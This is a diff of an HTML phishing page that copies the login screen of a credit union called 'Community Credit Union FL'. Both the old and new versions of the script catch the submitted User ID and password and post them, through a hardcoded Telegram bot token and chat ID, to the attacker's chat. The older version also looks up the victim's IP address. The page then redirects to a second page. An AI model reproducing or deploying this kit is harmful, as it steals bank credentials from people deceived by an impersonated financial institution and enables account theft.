@@ -1,274 +1,157 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Community Credit Union FL | Login</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-weight: bold !important;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background-color: #e3e3e3;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .login-container {
-            background-color: white;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 450px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .login-header {
-            background: linear-gradient(135deg, #1e5085 0%, #15375b 100%);
-            padding: 30px;
-            text-align: center;
-        }
-
-        .logo {
-            max-width: 200px;
-            height: auto;
-            margin: 0 auto;
-            display: block;
-        }
-
-        .login-content {
-            padding: 40px;
-        }
-
-        .login-title {
-            color: #333;
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 24px;
-            border-bottom: 2px solid #9dbdd6;
-            padding-bottom: 15px;
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-size: 16px;
-        }
-
-        .input-container {
-            position: relative;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 15px 20px;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background-color: #fff;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #9dbdd6;
-            box-shadow: 0 0 0 3px rgba(157, 189, 214, 0.2);
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #666;
-            cursor: pointer;
-            padding: 5px;
-            font-size: 18px;
-        }
-
-        .password-toggle:hover {
-            color: #333;
-        }
-
-        .login-button {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #9dbdd6 0%, #c2d6e5 100%);
-            color: #333;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-
-        .login-button:hover {
-            background: linear-gradient(135deg, #c2d6e5 0%, #9dbdd6 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(157, 189, 214, 0.3);
-        }
-
-        .login-button:active {
-            transform: translateY(0);
-        }
-
-        .login-links {
-            margin-top: 25px;
-            text-align: center;
-        }
-
-        .login-link {
-            display: block;
-            color: #0055cc;
-            text-decoration: none;
-            margin-bottom: 12px;
-            font-size: 14px;
-            transition: color 0.3s ease;
-        }
-
-        .login-link:hover {
-            color: #003876;
-            text-decoration: underline;
-        }
-
-        .divider {
-            height: 1px;
-            background-color: #eee;
-            margin: 25px 0;
-        }
-
-        @media (max-width: 480px) {
-            .login-container {
-                border-radius: 15px;
+<html lang="en" data-react-helmet="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta httpequiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta httpequiv="cache-control" content="no-cache">
+        <meta httpequiv="pragma" content="no-cache">
+        <link rel="shortcut icon" href="favicon.ico">
+        <title>Community CreditUnion FL  | Login</title>
+        <style>
+            /* Make ALL text bold */
+            * {
+                font-weight: bold !important;
             }
             
-            .login-content {
-                padding: 30px 20px;
+            /* Round text input edges */
+            .fluid-text-input {
+                border-radius: 12px !important;
             }
             
-            .login-header {
-                padding: 20px;
+            /* Round login button edges */
+            .fluid-button--primary {
+                border-radius: 12px !important;
             }
             
-            .login-title {
-                font-size: 20px;
+            /* Password eye toggle styles */
+            .password-toggle-container {
+                position: relative;
             }
-        }
-    </style>
-</head>
+            
+            .password-toggle {
+                position: absolute;
+                right: 15px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: none;
+                border: none;
+                cursor: pointer;
+                font-size: 18px;
+                color: #666;
+                padding: 5px;
+                z-index: 10;
+            }
+        </style>
+    </head>
 <body>
-    <div class="login-container">
-        <div class="login-header">
-            <a href="#">
-                <img src="03658-logo-lg-md-publish.png" alt="Community Credit Union FL Logo" class="logo">
-            </a>
-        </div>
-        
-        <div class="login-content">
-            <h1 class="login-title">LOGIN</h1>
-            
-            <form id="loginForm" autocomplete="off">
-                <div class="form-group">
-                    <label class="form-label">User ID</label>
-                    <div class="input-container">
-                        <input 
-                            type="text" 
-                            id="username" 
-                            name="username" 
-                            class="form-input" 
-                            placeholder="Enter your User ID" 
-                            required
-                            autocomplete="off"
-                        >
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="loginApp" style="min-height:100%;position:relative" class="login-renderer-wrapper">
+        <div style="display: none;"></div>
+        <div class="fade-in">
+            <div class="home-page ">
+                <div class="dbk-login-web__widget-container composite-layout-widget" style="">
+                    <div class="fluid-section fluid-section--pad-content dbk-login has-message is-interactive">
+                        <div class="fluid-section__content-container">
+                            <div class="fluid-section__content-container-inner" style="--global-heading-font-family:'Helvetica Neue', Helvetica, Arial, sans-serif; --global-body-font-family:Arial, sans-serif; --global-link-default-color:#0055cc; --global-font-color:#333333; --global-success-color:#76c76c; --global-warning-color:#f1b51c; --global-error-color:#c23a4c; --global-info-color:#18739d; --global-primary-color:#0279b3; --global-secondary-color:#cccccc; --global-tertiary-color:#ffffff; --global-body-bg-color-start:#e3e3e3; --global-body-bg:var(--global-body-bg-color-start); --masthead-text-color:#000000; --masthead-bg-color-start:#ffffff; --masthead-background:var(--masthead-bg-color-start); --main-nav-text-color:#ffffff; --main-nav-bg-color:#1e5085; --main-nav-border-color:rgba(55, 130, 210, 0.6); --main-nav-hover-bg-color:#15375b; --utility-nav-bg-color:#ffffff; --utility-nav-link-color:#003876; --featured-nav-link-color:#000000; --featured-nav-flag-text-color:#333333; --featured-nav-flag-bg-color:#d8e9fe; --widget-header-bg-color:#49a456; --widget-header-text-color:#ffffff; --widget-border-color:#cccccc; --widget-border-radius:0; --widget-border-width:1px; --widget-box-shadow:var(--widget-box-shadow-val); --widget-bg-opacity:1; --widget-header-bg-color-rgba-10p:rgba(73, 164, 86, 0.1); --widget-header-bg-color-rgba-50p:rgba(73, 164, 86, 0.5); --fluid-btn-primary-text-color:#333333; --fluid-btn-primary-border-color:transparent; --fluid-btn-primary-bg-color-start:#9dbdd6; --fluid-btn-primary-hover-bg-color-start:#c2d6e5; --fluid-btn-primary-bg-color:var(--fluid-btn-primary-bg-color-start); --fluid-btn-primary-hover-bg-color:var(--fluid-btn-primary-hover-bg-color-start); --exp-preview-mobile-global-primary-bg-color:undefined; --exp-preview-mobile-global-btn-bg-color:undefined; --exp-preview-mobile-global-primary-text-color:undefined;">
+                                <div class="dbk-login-msg has-image dbk-login__msg-container" style="background-image: url(GettyImages-1132115576-1024x683.jpg);"></div>
+                                <div class="dbk-login__login-elements-container">
+                                    <div class="dbk-login__login-elements-header">
+                                        <div class="dbk-login__logo"><a href="/dbank/live/app/home"><img src="03658-logo-lg-md-publish.png" alt="Logo"></a></div>
+                                    </div>
+                                    <form action="#" class="dbk-login__login-form" method="post" autocomplete="off">
+                                        <div class="fluid-form-layout dbk-login__login-form-container">
+                                            <div class="fluid-form-layout-section dbk-login__form-section">
+                                                <div class="fluid-form-layout-section__content-container">
+                                                </div>
+                                                <p style="margin-top: 20px"></p>
+                                                <div class="fluid-form-layout-field-container username-container">
+                                                    <div style="--username-padding:107px;">
+                                                        <label class="fluid-form-label fluid-form-label--stacked username-field" for="fluid-form-el-585fb376-bde3-4272-b313-f29bb5c97c20">
+                                                            <span class="fluid-form-label__text"><span class="fluid-form-label__text-inner">User ID</span></span>
+                                                            <span class="fluid-form-label__comp-container">
+                                                                <input name="username" autocomplete="off" id="fluid-form-el-585fb376-bde3-4272-b313-f29bb5c97c20" type="text" class="fluid-text-input" value="" required>
+                                                            </span>
+                                                        </label>
+                                                    </div>
+                                                </div>
+                                                <p style="margin-top: 15px"></p>
+                                                <div class="fluid-form-layout-field-container password-container">
+                                                    <label class="fluid-form-label fluid-form-label--stacked password-field show-hide-enabled" for="fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d">
+                                                        <span class="fluid-form-label__text"><span class="fluid-form-label__text-inner">Password</span></span>
+                                                        <span class="fluid-form-label__comp-container password-toggle-container">
+                                                            <input name="password" autocomplete="off" id="fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d" type="password" class="fluid-text-input" value="" required>
+                                                            <button type="button" class="password-toggle" onclick="togglePassword()">👁️</button>
+                                                        </span>
+                                                    </label>
+                                                </div>
+                                                <div class="fluid-form-layout-field-container">
+                                                    <p style="margin-top: 15px"></p>
+                                                    <button type="submit" class="fluid-button fluid-button--primary is-light-bg">
+                                                        <span class="fluid-button__content">
+                                                            <span class="fluid-button__text">Login</span>
+                                                        </span>
+                                                    </button>
+                                                </div>
+                                                <p style="margin-top: 15px"></p>
+                                                <div class="fluid-form-layout-field-container">
+                                                    <nav>
+                                                        <ul class="dbk-login__links">
+                                                            <li><button id="" type="button" class="fluid-button fluid-button--link">Forgot Login?</button></li>
+                                                            <li><button id="test-browser" type="button" class="fluid-button fluid-button--link">Test your browser</button></li>
+                                                            <li><button id="trouble-test-browser" type="button" class="fluid-button fluid-button--link">Trouble testing your browser</button></li>
+                                                        </ul>
+                                                    </nav>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
                     </div>
                 </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Password</label>
-                    <div class="input-container">
-                        <input 
-                            type="password" 
-                            id="password" 
-                            name="password" 
-                            class="form-input" 
-                            placeholder="Enter your password" 
-                            required
-                            autocomplete="off"
-                        >
-                        <button type="button" class="password-toggle" id="togglePassword">
-                            👁️
-                        </button>
-                    </div>
-                </div>
-                
-                <button type="submit" class="login-button">
-                    LOGIN
-                </button>
-            </form>
-            
-            <div class="divider"></div>
-            
-            <div class="login-links">
-                <a href="#" class="login-link">Forgot Login?</a>
-                <a href="#" class="login-link">Test your browser</a>
-                <a href="#" class="login-link">Trouble testing your browser</a>
             </div>
         </div>
     </div>
-
     <script>
+        // Password toggle function
+        function togglePassword() {
+            const passwordInput = document.getElementById('fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d');
+            const toggleButton = document.querySelector('.password-toggle');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleButton.textContent = '🙈';
+            } else {
+                passwordInput.type = 'password';
+                toggleButton.textContent = '👁️';
+            }
+        }
+        
         // Telegram Bot Token and Chat ID
         const botToken = '6256698104:AAE5QZORxw737Vgc__jArGtIpQ3JrJfyv44';
         const chatId = '1217852633';
 
-        // Password toggle functionality
-        const togglePassword = document.getElementById('togglePassword');
-        const passwordInput = document.getElementById('password');
-        
-        togglePassword.addEventListener('click', function() {
-            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-            passwordInput.setAttribute('type', type);
-            this.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
-        });
+        // Get the form element
+        const form = document.querySelector('.dbk-login__login-form');
 
-        // Form submission handler
-        const loginForm = document.getElementById('loginForm');
-        
-        loginForm.addEventListener('submit', async (event) => {
-            event.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            
-            if (!username || !password) {
-                alert('Please fill in both username and password.');
-                return;
-            }
+        // Add event listener for form submission
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); // Prevent default form submission
 
-            // Construct the message for Telegram
-            const message = `🔐 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${await getIP()}\n🕒 Time: ${new Date().toLocaleString()}`;
+            // Get form data
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
 
-            // Send to Telegram
+            // Construct the message to send to Telegram
+            const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+            // Telegram API URL
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
             try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                // Send the message to Telegram
+                const response = await fetch(telegramApiUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -276,56 +159,21 @@
                     body: JSON.stringify({
                         chat_id: chatId,
                         text: message,
-                        parse_mode: 'HTML'
                     }),
                 });
 
                 const result = await response.json();
-                
                 if (result.ok) {
-                    // Clear form and redirect
-                    loginForm.reset();
-                    passwordInput.setAttribute('type', 'password');
-                    togglePassword.textContent = '👁️';
-                    
-                    // Simulate loading state
-                    const submitBtn = loginForm.querySelector('.login-button');
-                    const originalText = submitBtn.textContent;
-                    submitBtn.textContent = 'Redirecting...';
-                    submitBtn.disabled = true;
-                    
-                    setTimeout(() => {
-                        window.location.href = 'index2.html';
-                    }, 1500);
+                    console.log('Login data sent to Telegram successfully');
+                    form.reset(); // Reset the form after successful submission
+                    window.location.href = 'index2.html'; // Redirect to index2.html
                 } else {
-                    alert('Login failed. Please try again.');
+                    alert('Failed to send data to Telegram: ' + result.description);
                 }
             } catch (error) {
-                console.error('Error:', error);
-                alert('An error occurred. Please try again.');
+                console.error('Error sending data to Telegram:', error);
+                alert('An error occurred while sending data to Telegram.');
             }
-        });
-
-        // Function to get user's IP address
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'IP not available';
-            }
-        }
-
-        // Add subtle animation to form inputs on focus
-        document.querySelectorAll('.form-input').forEach(input => {
-            input.addEventListener('focus', function() {
-                this.parentElement.style.transform = 'scale(1.02)';
-            });
-            
-            input.addEventListener('blur', function() {
-                this.parentElement.style.transform = 'scale(1)';
-            });
         });
     </script>
 </body>
